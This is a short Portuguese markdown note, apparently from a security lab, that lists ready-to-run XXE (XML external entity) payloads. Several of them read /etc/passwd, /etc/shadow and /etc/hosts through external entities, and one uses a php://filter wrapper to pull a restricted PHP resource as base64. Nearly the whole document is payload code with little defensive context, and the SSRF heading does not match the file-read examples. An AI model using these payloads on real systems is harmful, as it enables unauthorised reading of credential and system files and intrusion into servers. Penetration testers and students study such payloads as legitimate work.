# Para explorar a vulnerabilidade XXE, execute os xmls abaixo para anlise do retorno.

## Explorando XXE para realizar ataques SSRF

**Payload**

Para a anlise da vulnerabilidade utilizei o payload abaixo:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

Abaixo demais exemplos de Payloads.

**XXE: File Disclosure** *(Exibição do conteúdo de Arquivo)*

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]>
<userInfo>
 <firstName>John</firstName>
 <lastName>&ent;</lastName>
</userInfo>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

**XXE: Access Control Bypass (Loading Restricted Resources - PHP example)** *(XXE: Bypass de controle de acesso (carregando recursos restritos - exemplo PHP)*

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php">]>
<foo><result>&ac;</result></foo>
```